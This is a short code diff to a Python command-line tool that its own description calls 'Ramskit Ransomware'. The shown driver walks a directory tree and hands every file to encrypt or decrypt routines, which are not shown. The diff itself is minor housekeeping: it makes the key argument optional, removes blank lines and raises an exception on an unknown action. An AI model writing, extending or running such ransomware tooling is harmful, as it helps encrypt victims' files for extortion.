@@ -43,7 +43,7 @@ class Ramskit:
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-k', '--key', dest="key", required=True, help='Key file')
+    parser.add_argument('-k', '--key', dest="key", help='Key file')
     parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
 
@@ -59,17 +59,14 @@ if __name__ == '__main__':
             for f in files:
                 items.append(os.path.join(root, f))
         ramskit.encrypt_file(items)
-
     elif action == 'decrypt':
         items = []
         for root, _, files in os.walk(path):
             for f in files:
                 items.append(os.path.join(root, f))
         ramskit.decrypt_file(items)
-    
     elif action == 'generate_key':
         print(ramskit.generate_key())
-    
     else:
-        print('Unknown action: {}'.format(action))
+        raise Exception('Invalid action: ', action)
         sys.exit(1)
